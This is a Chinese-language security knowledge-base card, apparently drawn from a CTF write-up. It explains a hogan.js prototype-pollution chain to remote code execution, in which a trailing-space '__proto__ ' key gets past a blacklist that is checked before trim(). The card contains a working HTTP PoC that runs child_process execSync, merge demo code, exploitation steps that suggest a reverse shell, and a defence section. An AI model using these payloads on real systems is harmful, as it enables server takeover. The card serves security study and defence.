---
id: web-nodejs-prototype-pollution-hogan-delimiters-indent-rce
title: hogan.js 原型链污染 RCE：污染 Object.prototype.delimiters 控制扫描分隔符、污染 indent 注入生成代码，键名尾随空格绕过 UNSAFE_KEYS 的 trim 检查
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: hogan-prototype-pollution-delimiters-indent-rce
tags:
- nodejs
- prototype-pollution
- hogan
- template-engine
- rce
- delimiters
- indent
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V551
  verified_at: '2026-11-11T22:46:52+08:00'
  notes: 已通读 content.md 并核对全部 3 张截图（图1 DiceCTF flag、图2 NestJS getUser JSON.parse/hasOwnProperty("$where")、图3 admin flag 路由；Hogan 部分原文为代码段无截图）。技术点核对：原文 merge 确为'先 UNSAFE_KEYS.includes(key) 再 key.trim()'，'__proto__ '（尾随空格）绕过成立；Hogan.compile 中 options=options||{} 后 scan(text,options.delimiters) 会沿原型链读到 Object.prototype.delimiters，scan 用 split(' ') 得 otag/ctag，原文'找到 > 即可在周围解析代码'与 Hogan 以 otag 后首字符 '>' 判为 partial 的逻辑一致；createPartial 的 indent 拼接与原文引用代码一致；污染 payload（delimiters=tr \n'、indent=/*"));return ...//*/）与原文一致。核对中修正执行归属：RCE 实际是 Hogan 在 generate 阶段用 new Function 编译生成代码、template.render() 时执行，注入的 return 直接作为 render 返回值随 res.send 回显；原文路由中 render 之后的 Function('return ' + template) 只是异常兜底（template 为对象，字符串化为 [object Object]），原卡误写为其执行注入代码，已更正。dedup：hogan 卡 recommendation=new，候选 filter-bypass/lodash-EJS 系列/merge-json-parse/deepmerge/NODE_OPTIONS 等均为不同 gadget，无同链重复。原文未标注版本，未设 affected_versions。未验证点：未在本地 hogan.js 实际跑通 delimiters+indent 链，机制结论基于原文代码与 hogan 源码行为。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-hogan-delimiters-indent-rce/
draft: false
kb_aliases:
- hogan.js RCE
- Hogan.compile 原型污染
- Object.prototype.delimiters
- Object.prototype.indent
- UNSAFE_KEYS trim 绕过
- 模板引擎原型链污染
---

## 一句话结论

当应用用递归 merge 合并用户对象且只按字面量过滤 `__proto__`/`constructor`/`prototype` 时，可用键名 `"__proto__ "`（尾随空格）先绕过 `includes` 检查、再经 `key.trim()` 变回 `__proto__` 污染 `Object.prototype`；随后污染 `delimiters` 让 Hogan 扫描器把模板里的普通 HTML（如 `<tr>`）当成标签边界、污染 `indent` 把任意代码拼进 Hogan 生成的模板函数源码，最终由 Hogan 用 `new Function` 编译的模板函数在 `render` 时执行命令（注入的 `return` 可直接回显命令输出）。

## 原理

- **污染入口**：示例 merge 逻辑先 `if (UNSAFE_KEYS.includes(key)) continue;` 再 `key = key.trim();`，检查与使用之间存在 trim 差异。表单/qs 解析出的键 `"__proto__ "`（`__proto__` 后带空格再接 `[delimiters]` 等嵌套键）不匹配黑名单，却会在 trim 后成为 `__proto__`；由于 `obj1["__proto__"]` 已定义且值是对象，`merge` 会递归进入 `Object.prototype` 并把子键写上去，造成全局原型污染。
- **delimiters 控制扫描**：`Hogan.compile(text, options)` 中 `options = options || {}`，随后 `this.scan(text, options.delimiters)`。调用方没传 options 时，`options.delimiters` 会沿原型链读到被污染的 `Object.prototype.delimiters`。`Hogan.scan` 用 `delimiters.split(' ')` 得到 `otag`/`ctag`，攻击者可把开始标记设成模板中必然出现的字符串（如 `tr`），让扫描器在 HTML 的 `<tr>` 处按攻击者指定的结束标记切分，把后续内容当作 Hogan 标签解析。
- **indent 注入代码**：Hogan 生成 partial 调用时执行 `context.code += 't.b(t.rp("' + esc(sym) + '",c,p,"' + (node.indent || '') + '"));'`，`node.indent` 来自被污染的 `Object.prototype.indent`。把 indent 设为 `/*"));return <代码>//*/` 之类的值，会闭合字符串与函数调用、插入 `return` 语句，并把剩余部分注释掉，使生成的模板函数体包含攻击者的代码。
- **最终执行**：Hogan 在 generate 阶段把生成的模板代码字符串用 `new Function` 编译为模板函数（模板实例的 `r`），`template.render()` 调用的就是这个编译产物；被污染的 `indent` 已把 `/*"));return <命令>//*/` 拼进函数体，渲染到该 partial 调用时执行 `return`，命令输出直接作为 `template.render()` 的返回值，随示例路由的 `res.send(template.render({data}))` 回显。示例中 `render` 之后的 `Function('return ' + template)` 只是异常兜底，`template` 为 Hogan Template 对象（字符串化为 `[object Object]`），通常不参与利用。
- **为什么成立**：过滤发生在 trim 前，属于典型的“规范化差异”绕过；模板引擎把对象属性（indent）直接拼进生成的 JS 源码，属于代码生成阶段的注入；原型链污染让攻击者无需控制传给 `compile` 的 options 就能影响编译参数。

## 触发条件

- Node.js 应用使用 hogan.js 编译模板，且模板编译时 `options` 为 `{}` 或未显式传入 `delimiters`/`indent`。
- 存在递归 merge/assign 把用户可控键名写入对象，且危险键过滤与 trim/规范化顺序不当（检查前未 trim，或只过滤字面量）。
- 模板内容包含攻击者可预期的固定字符串（如 HTML 标签 `<tr>`）可供 delimiter 匹配；Hogan 在 generate 阶段用 `new Function` 编译生成代码、`template.render()` 时执行（应用若另有 `Function`/`eval` 执行生成代码的路径亦可触发）。
- 攻击者可向 merge 入口提交带嵌套键的 urlencoded/JSON 数据（`express.urlencoded({extended:true})` 的 qs 解析支持嵌套）。

## 利用步骤

1. 确认 merge 入口与过滤逻辑：检查 `UNSAFE_KEYS.includes(key)` 与 `key.trim()` 的先后顺序，寻找尾随空格/点号/编码等规范化差异。
2. 污染 `delimiters`：提交键 `__proto__ [delimiters]`（`__proto__` 与 `[` 之间有空格），值为模板中会出现的开始字符串与结束字符串，以空格分隔，如 `tr \n'`。
3. 污染 `indent`：提交键 `__proto__ [indent]`，值为闭合当前代码并注入命令的片段，如 `/*"));return process.mainModule.require('child_process').execSync('/flag').toString()//*/`。
4. 触发模板编译/渲染：请求使用 hogan 编译固定模板的接口（示例 `/get-data`），污染在 `Hogan.compile` 调用前生效。
5. 观察响应：注入的 `return` 使 `template.render()` 直接返回命令输出，随 `res.send(...)` 响应体回显；按需替换命令为反弹 shell 或写文件。

## PoC

污染请求（form-urlencoded，关键在 `__proto__` 后的空格）：

```http
POST /get-data HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

__proto__%20[delimiters]=tr%20%0a%27&__proto__%20[indent]=/*%22));return%20process.mainModule.require(%60child_process%60).execSync(%60/flag%60).toString()//*/
```

等价 merge 入口演示（Node）：

```js
const UNSAFE_KEYS = ["__proto__", "constructor", "prototype"];
const merge = (obj1, obj2) => {
  for (let key of Object.keys(obj2)) {
    if (UNSAFE_KEYS.includes(key)) continue;   // " "__proto__ "" 不匹配
    const val = obj2[key];
    key = key.trim();                          // 变回 "__proto__"
    if (typeof obj1[key] !== "undefined" && typeof val === "object") {
      obj1[key] = merge(obj1[key], val);       // 递归写入 Object.prototype
    } else {
      obj1[key] = val;
    }
  }
  return obj1;
};

merge({}, { "__proto__ ": { delimiters: "tr \n'", indent: "/*\"));return process.mainModule.require('child_process').execSync('/flag').toString()//*/" } });
// 之后 Hogan.compile(TEMPLATE) 的 options.delimiters/indent 即被污染
```

Hogan 生成代码片段（注入点）：

```js
context.code += 't.b(t.rp("' + esc(sym) + '",c,p,"' + (node.indent || '') + '"));';
```

## 变体与关联

- 变体：过滤在 trim 之后、但只过滤字面量 `__proto__` 时，可改用 `constructor.prototype`、嵌套无害键、Unicode 转义或表单参数解析绕过。
- 变体：其他模板引擎的同类 gadget：EJS `outputFunctionName`、lodash.template `sourceURL`、Handlebars 等，都是把原型属性拼进生成的 JS 源码。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]]（merge 深合并与 JSON.parse 的 `__proto__` 差异）、[[web-nodejs-prototype-pollution-filter-bypass]]（过滤位置/编码的多种绕过）、[[web-nodejs-prototype-pollution-ejs-outputfunctionname-rce]]（EJS 同类代码生成注入）、[[web-nodejs-prototype-pollution-lodash-template-sourceurl-rce]]（lodash.template 同类注入）。
- 边界：需要 merge 入口能提交嵌套键且目标对象上 `__proto__` 已有定义；Hogan 版本需存在 `indent` 拼接逻辑；`template.render()`（内部 `new Function` 执行生成代码）或应用自身 `Function`/`eval` 是最终触发条件。

## 检测与防御

- 修复：在过滤前先做 `trim()`/规范化，或直接拒绝包含 `__proto__`、`constructor`、`prototype` 的任何键（含前后空格、编码变体）；使用 `Object.create(null)` 作为合并目标，避免写入 `Object.prototype`。
- 模板侧：升级 hogan.js，避免把对象属性直接拼进生成代码；编译 options 显式赋值为 `Object.create(null)` 或冻结对象，阻断原型链读取。
- 检测：请求体中出现 `__proto__` 带空格/编码变体、`constructor[prototype]` 等嵌套键；服务端出现异常的 `Function`/`eval` 调用与 `child_process` 执行。
- 通用：对 merge/assign 库做原型污染测试（`__proto__`、`constructor.prototype`、`prototype` 及规范化变体），并在 CI 中固定模板引擎版本。
